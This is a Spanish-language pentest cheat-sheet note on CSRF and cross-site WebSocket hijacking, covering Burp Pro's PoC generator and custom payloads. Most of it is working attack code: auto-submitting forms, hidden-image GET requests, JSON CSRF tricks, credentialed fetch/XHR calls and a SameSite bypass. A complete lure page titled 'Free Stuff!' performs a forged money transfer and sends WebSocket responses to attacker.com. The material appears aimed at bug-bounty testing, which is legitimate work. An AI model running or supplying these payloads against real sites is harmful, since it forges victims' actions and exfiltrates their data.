---
aliases:
  - CSRF PoC Generator
  - Burp CSRF
  - CSWSH PoC
tags:
  - type/tool
  - vuln/csrf
  - technique/discovery
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[Cross-Site Request Forgery (CSRF)]]'
  - '[[Burp Suite]]'
---
# CSRF - Tooling

***

## Burp PoC Generator

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Right-click request → Engagement Tools → "Generate CSRF PoC" | HTML PoC auto-generado | Burp Pro con state-changing request capturado. |
| Generate CSRF PoC → "Include auto-submit script" checkbox | PoC con submit JS automático | Sin user click required. |
| Generate CSRF PoC → "Test in browser" button | Copy HTML + abrir en browser logged-in | Quick local test. |
| Generate CSRF PoC → modify Content-Type a `text/plain` para JSON CSRF | JSON CSRF PoC desde Burp | API JSON tolerante. |
| Burp Pro Active Scanner → marca endpoints sin CSRF token | Bulk vuln scan | Pre-PoC discovery. |
| Burp Repeater → toggle method GET/POST + check si endpoint cambia state | Method-based bypass probe | SameSite=Lax check. |
| Save PoC as `poc.html` con `Ctrl+S` | Reportable artifact | Bug bounty submission. |
^csrf-tool-burp

___

## Custom HTML PoCs

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<form action="..." method="POST"><input name="..." value="..."></form><script>document.forms[0].submit()</script>` | Standard form auto-submit POST | Endpoint POST sin CSRF token. |
| `<img src="https://target/api/x?id=42" style="display:none">` | GET CSRF stealth | Endpoint GET state-changing. |
| `<form enctype="text/plain"><input name='{"k":"v","_":' value='_"}'></form>` | JSON CSRF via text/plain | API JSON tolerante. |
| `<form enctype="multipart/form-data"><input type="file" name="upload"></form>` + JS sets file | File upload CSRF | Multipart upload sin token. |
| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:'k=v', headers:{'Content-Type':'application/x-www-form-urlencoded'}})` | fetch sin preflight | CORS simple request. |
| `var x=new XMLHttpRequest(); x.open('POST','...'); x.withCredentials=true; x.send('k=v');` | XHR clásico con cookies | IE compat / fallback. |
| `navigator.sendBeacon('https://target/...', new Blob([body]))` | Async fire-and-forget | Survives page unload. |
| `<iframe src="malicious.html" style="display:none"></iframe>` | Embed PoC en otro sitio | Multi-page attack. |
| `<meta http-equiv="refresh" content="0;url=https://target/api/x?id=42">` | Auto-redirect GET | SameSite Lax bypass. |
^csrf-tool-html-poc

___

## CSWSH PoC Builder

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `const ws = new WebSocket('wss://target/'); ws.onopen=()=>ws.send('cmd');` | WS handshake con cookies + send arbitrary | Server no valida Origin. |
| `ws.onmessage=(e)=>fetch('//attacker/log?d='+encodeURIComponent(e.data))` | Exfil respuestas WS al atacante | Read-access streaming. |
| `new WebSocket(url, ['protocol-name'])` con subprotocol específico | Subprotocol negotiation abuse | Server requiere subprotocol. |
| `wscat -c wss://target/ -H "Cookie: session=$VICTIM"` | Replay manual con cookie capturada | Post-cookie theft. |
| `websocat wss://target/socket --header "Cookie: session=..."` | CLI alternative para test manual | Sin browser. |
| Burp Pro → WebSocket Repeater → modify frames + replay | Manual frame manipulation | Active testing en sesión. |
| `curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" -H "Origin: https://attacker.com" https://target/socket` | Test Origin enforcement | Defense check raw. |
^csrf-tool-cswsh

### CSWSH PoC completo

```html
<!DOCTYPE html>
<html>
<body>
<h1>Free Stuff!</h1>
<script>
  const ws = new WebSocket('wss://target.com/api/socket');
  ws.onopen = () => {
    ws.send(JSON.stringify({type:'transfer', to:'attacker', amount:1000}));
  };
  ws.onmessage = (event) => {
    fetch('https://attacker.com/exfil?data=' + encodeURIComponent(event.data));
  };
  ws.onerror = (err) => {
    fetch('https://attacker.com/log?err=' + err.message);
  };
</script>
</body>
</html>
```

***
